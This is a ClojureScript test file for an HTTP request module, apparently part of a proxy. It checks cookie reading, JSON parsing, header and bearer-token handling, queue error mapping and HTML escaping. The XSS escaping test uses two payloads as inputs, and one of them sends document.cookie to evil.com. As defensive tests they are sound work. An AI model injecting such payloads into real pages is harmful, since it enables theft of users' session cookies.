(ns proxx.http.request-test
  (:require [cljs.test :refer [deftest is testing]]
            [clojure.string :as str]
            [proxx.http.request :as r]
            [proxx.runtime.http :as edge]))

(deftest cookies
  (is (= "v" (r/read-cookie-token "a=1; tok=v; b=2" "tok")))
  (is (= "a b" (r/read-cookie-token "tok=a%20b" "tok")))
  (is (= "%E0%A4%A" (r/read-cookie-token "tok=%E0%A4%A" "tok")) "malformed escapes fall back to raw")
  (is (= "" (r/read-cookie-token "tok=" "tok")) "an empty value is still a value")
  (is (= "first" (r/read-cookie-token "tok=first; tok=second" "tok")))
  (is (nil? (r/read-cookie-token "xtok=1" "tok")) "name must match exactly")
  (is (nil? (r/read-cookie-token "" "tok")))
  (is (nil? (r/read-cookie-token nil "tok"))))

(deftest json-if-possible
  (let [parse #(js->clj (js/JSON.parse %))]
    (is (= {:value {"a" 1}} (r/parse-json-if-possible parse "{\"a\":1}")))
    (is (= {:value nil} (r/parse-json-if-possible parse "null")) "null is a value, not a failure")
    (is (nil? (r/parse-json-if-possible parse "  ")))
    (is (nil? (r/parse-json-if-possible parse "{nope")))))

(deftest headers-and-models
  (is (= "x" (r/single-header-value "x")))
  (is (= "b" (r/single-header-value ["" 5 "b" "c"])))
  (is (nil? (r/single-header-value ["" nil])))
  (is (nil? (r/single-header-value 5)))
  (is (= "m" (r/normalize-requested-model "  m\n")))
  (is (nil? (r/normalize-requested-model "   ")))
  (is (nil? (r/normalize-requested-model 5)))
  (is (= "&lt;a href=&quot;x&quot;&gt;&amp;&#39;&lt;/a&gt;" (r/escape-html "<a href=\"x\">&'</a>")))
  (doseq [a ["127.0.0.1" "::1" "::ffff:127.0.0.1"]] (is (r/trusted-local-bridge-address? a)))
  (is (not (r/trusted-local-bridge-address? "10.0.0.1")))
  (is (not (r/trusted-local-bridge-address? nil))))

(deftest bearer
  (is (r/bearer-token? "Bearer secret" "secret"))
  (is (r/bearer-token? "bEaReR   secret extra" "secret") "only the first two fields count")
  (is (not (r/bearer-token? "Bearer wrong" "secret")))
  (is (not (r/bearer-token? "Bearer secre" "secret")))
  (is (not (r/bearer-token? "Bearer Secret" "secret")) "same length, differs only in case")
  (is (not (r/bearer-token? "Bearer secrex" "secret")) "same length, differs in the last char")
  (is (r/bearer-token? "Bearer sécret" "sécret"))
  (is (r/bearer-token? "Bearer " ""))
  (is (not (r/bearer-token? "Basic secret" "secret")))
  (is (not (r/bearer-token? " Bearer secret" "secret")) "leading whitespace yields an empty scheme")
  (is (not (r/bearer-token? "Bearer" "secret")))
  (is (not (r/bearer-token? "" "secret")))
  (is (not (r/bearer-token? nil "secret"))))

(deftest queue-errors
  (is (= {:status 429 :message "Request queue full" :type "server_error" :code "queue_full" :retry-after-seconds 3}
         (r/queue-error-response {"code" ":queue/full" "retry-after-ms" 2100})))
  (is (= 1 (:retry-after-seconds (r/queue-error-response {:code :queue/full :retryAfterMs 5}))))
  (is (not (contains? (r/queue-error-response {:code "queue/full" "retry-after-ms" "soon"}) :retry-after-seconds)))
  (doseq [code ["queue/dropped" "queue/total-timeout" ":queue/exhausted"]]
    (is (= {:status 503 :message "Request queue dropped or timed out" :type "server_error" :code "queue_dropped"}
           (r/queue-error-response {"code" code}))))
  (is (= 429 (:status (r/queue-error-response {"code" {"ns" "queue" "name" "full"}}))) "serialized keyword object")
  (is (nil? (r/queue-error-response {"code" "other"})))
  (is (nil? (r/queue-error-response nil))))

(deftest edge-preserves-js-values
  (let [parsed (edge/parse-json-if-possible-js "{\"z\":1,\"a\":[1,null]}")]
    (is (= ["z" "a"] (vec (js/Object.keys parsed))) "key order untouched"))
  (is (nil? (edge/parse-json-if-possible-js "null")))
  (is (undefined? (edge/parse-json-if-possible-js "")))
  (is (= "b" (edge/read-single-header-js #js {"h" #js ["" "b"]} "h")))
  (is (undefined? (edge/read-single-header-js #js {} "h")))
  (is (undefined? (edge/read-cookie-token-js "a=1" "tok")))
  (is (= 429 (.-statusCode (edge/queue-error-response-js #js {"data" #js {"code" "queue/full"}}))))
  (is (undefined? (edge/queue-error-response-js #js {"data" #js {"code" "x"}})))
  (is (undefined? (edge/queue-error-response-js #js {}))))

;; ---- ported from src/tests/escape-html.test.ts (13 tests) ----------------

(deftest escape-html-basic-characters
  (is (= "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;" (r/escape-html "<script>alert('xss')</script>")) "escapes < and >")
  (is (= "Tom &amp; Jerry" (r/escape-html "Tom & Jerry")) "escapes &")
  (is (= "She said &quot;hello&quot;" (r/escape-html "She said \"hello\"")) "escapes double quotes")
  (is (= "O&#39;Brien" (r/escape-html "O'Brien")) "escapes single quotes"))

(deftest escape-html-all-five-characters-together
  (is (= "&lt;div class=&quot;test&quot; data-name=&#39;a&amp;b&#39;&gt;"
         (r/escape-html "<div class=\"test\" data-name='a&b'>"))))

(deftest escape-html-no-double-encoding-of-static-strings
  (is (= "Missing OAuth callback state or code." (r/escape-html "Missing OAuth callback state or code.")))
  (is (= "&amp;amp;" (r/escape-html "&amp;")) "raw input is encoded exactly once per call"))

(deftest escape-html-legitimate-special-characters
  (is (= "O&#39;Brien &amp; Associates" (r/escape-html "O'Brien & Associates"))))

(deftest escape-html-edge-cases
  (is (= "" (r/escape-html "")))
  (is (= "Hello world 123" (r/escape-html "Hello world 123")))
  (is (= "&lt;&gt;&amp;&quot;&#39;" (r/escape-html "<>&\"'"))))

(deftest escape-html-neutralizes-xss-payloads
  (let [result (r/escape-html "<script>document.location=\"http://evil.com/?c=\"+document.cookie</script>")]
    (is (not (str/includes? result "<script>")) "result must not contain raw <script> tag")
    (is (not (str/includes? result "</script>")) "result must not contain raw </script> tag")
    (is (str/includes? result "&lt;script&gt;")))
  (let [result (r/escape-html "<img onerror=alert(1) src=\"x\">")]
    (is (not (str/includes? result "<img")) "result must not contain raw <img tag")
    (is (str/includes? result "&lt;img"))))

(deftest escape-html-edge-export-matches-pure-kernel
  (is (= (r/escape-html "<a & 'b'>") (edge/escape-html-js "<a & 'b'>"))))
